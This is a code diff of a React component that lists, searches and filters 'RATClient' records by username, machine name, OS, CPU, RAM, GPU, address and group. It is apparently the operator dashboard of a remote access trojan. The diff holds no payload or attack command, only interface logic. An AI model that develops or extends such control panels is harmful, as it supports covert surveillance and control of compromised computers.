@@ -42,13 +42,13 @@ export const Clients = () => {
 
       clientList.forEach((client: RATClient) => {
         // Add values to respective sets
-        groupValues.add(client.group);
-        osValues.add(client.os);
-        cpuValues.add(client.cpu);
+        groupValues.add(client.data.group);
+        osValues.add(client.system.os_full_name);
+        cpuValues.add(client.cpu.cpu_name);
 
         // Add each GPU to the set
         client.gpus.forEach((gpu) => {
-          gpuValues.add(gpu);
+          gpuValues.add(gpu.name);
         });
       });
 
@@ -87,24 +87,28 @@ export const Clients = () => {
       // Check if client matches search term
       const matchesSearch =
         searchTerm === "" ||
-        client.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        client.hostname.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        client.addr.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        client.os.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        client.cpu.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        client.ram.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        client.gpus.some((gpu) =>
-          gpu.toLowerCase().includes(searchTerm.toLowerCase())
-        );
+        client.system.username
+          .toLowerCase()
+          .includes(searchTerm.toLowerCase()) ||
+        client.system.machine_name
+          .toLowerCase()
+          .includes(searchTerm.toLowerCase()) ||
+        client.data.addr.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        client.system.os_full_name
+          .toLowerCase()
+          .includes(searchTerm.toLowerCase()) ||
+        client.cpu.cpu_name.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        client.ram.total_gb.toString().includes(searchTerm) ||
+        client.gpus.some((gpu) => gpu.name.toLowerCase().includes(searchTerm));
 
       // Check if client passes all filters
-      const passesGroupFilter = filters.group[client.group] !== false;
-      const passesOsFilter = filters.os[client.os] !== false;
-      const passesCpuFilter = filters.cpu[client.cpu] !== false;
+      const passesGroupFilter = filters.group[client.data.group] !== false;
+      const passesOsFilter = filters.os[client.system.os_full_name] !== false;
+      const passesCpuFilter = filters.cpu[client.cpu.cpu_name] !== false;
 
       // Check if at least one GPU passes the filter
       const passesGpuFilter = client.gpus.some(
-        (gpu) => filters.gpus[gpu] !== false
+        (gpu) => filters.gpus[gpu.name] !== false
       );
 
       return (
@@ -163,7 +167,7 @@ export const Clients = () => {
   }, [contextMenu]);
 
   useEffect(() => {
-    if (!clientList.some((client) => client.addr === selectedClient)) {
+    if (!clientList.some((client) => client.data.addr === selectedClient)) {
       setSelectedClient("");
       setSelectedClientDetails(null);
     }
